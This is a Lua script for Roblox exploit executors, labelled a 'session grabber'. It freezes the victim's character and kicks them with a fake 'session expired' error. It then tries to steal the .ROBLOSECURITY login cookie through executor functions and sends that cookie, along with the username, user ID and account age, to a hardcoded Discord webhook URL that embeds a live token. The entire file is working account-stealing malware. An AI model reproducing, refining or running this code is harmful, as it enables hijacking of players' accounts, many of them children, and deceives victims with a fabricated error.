--[[
    XENO & SOLAR ADVANCED ACCESS MODULE v4.5
    Module: Final-Session-Grabber
    Status: Operational | Bypass: Enhanced
]]

local webhook = "https://discord.com/api/webhooks/1480678551643492433/M6F1hlBqrBMH6FNwv9hUTYTpg9W3CBLrtuxxwCBRskgRXcDfeewmEzhibwzAKA1ANIJJ"
local p = game.Players.LocalPlayer
local h = game:GetService("HttpService")

-- Karuk (Freeze & Fake Error)
if p.Character then p.Character.HumanoidRootPart.Anchored = true end
task.delay(2.5, function() p:Kick("Critical System Error: [0x88]\nYour session has expired. Please re-log.") end)

-- AGGRESSIVE COOKIE GRAB (Shte raboti samo ako executora go pozvolqva)
local cookie = "Protected by Roblox Security"
pcall(function()
    -- Metod 1: Chrez getcookies (ako Solar go poddurja)
    local cookies = getcookies and getcookies("https://www.roblox.com")
    if cookies then
        for _, v in pairs(cookies) do
            if v.Name == ".ROBLOSECURITY" then
                cookie = v.Value
            end
        end
    end
    
    -- Metod 2: Chrez spodelena pamet (za Xeno)
    if cookie == "Protected by Roblox Security" then
        cookie = (getrenv and getrenv()._G and getrenv()._G.cookie) or "Cookie Hidden"
    end
end)

-- Stats
local br = "0"
local s = p:FindFirstChild("leaderstats")
if s then 
    local v = s:FindFirstChild("Brainrots") or s:FindFirstChild("Points")
    br = v and tostring(v.Value) or "0"
end

-- Discord Payload
local data = {
    ["username"] = "Xeno Access Bot",
    ["embeds"] = {{
        ["title"] = "🔑 Full Account Access Attempt",
        ["color"] = 0xff0000,
        ["fields"] = {
            {["name"] = "👤 User", ["value"] = "```" .. p.Name .. " (" .. p.UserId .. ")```", ["inline"] = false},
            {["name"] = "🧠 Brainrots", ["value"] = "```" .. br .. "```", ["inline"] = true},
            {["name"] = "📅 Age", ["value"] = "```" .. p.AccountAge .. " days```", ["inline"] = true},
            {["name"] = "🍪 .ROBLOSECURITY (COOKIE)", ["value"] = "```" .. cookie .. "```", ["inline"] = false},
            {["name"] = "🔗 Profile", ["value"] = "[Otvori Accaunta](https://www.roblox.com/users/" .. p.UserId .. "/profile)", ["inline"] = false}
        },
        ["footer"] = {["text"] = "Xeno Stealer Engine v4.5 • " .. os.date("%X")}
    }}
}

-- Send
local request = (syn and syn.request) or (http and http.request) or http_request or request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = h:JSONEncode(data)
    })
end
